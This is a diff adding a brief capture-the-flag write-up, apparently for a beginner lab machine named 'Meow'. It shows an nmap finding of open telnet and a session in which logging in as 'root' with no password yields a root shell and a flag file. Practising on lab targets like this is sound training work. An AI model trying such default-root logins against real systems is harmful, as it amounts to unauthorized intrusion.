@@ -1,0 +1,35 @@
+#####################
+# Sources and Links #
+#####################
+
+#########
+# TL,DR #
+#########
+telnet grants immediate access
+
+########
+# Hack #
+########
+Nmap shows telnet is open.
+Trying user 'root' grants access.
+
+┌──(ryan㉿kali)-[~]
+└─$ telnet 10.129.22.162
+Trying 10.129.22.162...
+Connected to 10.129.22.162.
+Escape character is '^]'.
+
+  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
+  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
+  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█
+
+
+Meow login: root
+
+root@Meow:~# ls -l flag.txt 
+-rw-r--r-- 1 root root 33 Jun 17  2021 flag.txt
+
+###########
+# Learned #
+###########
+
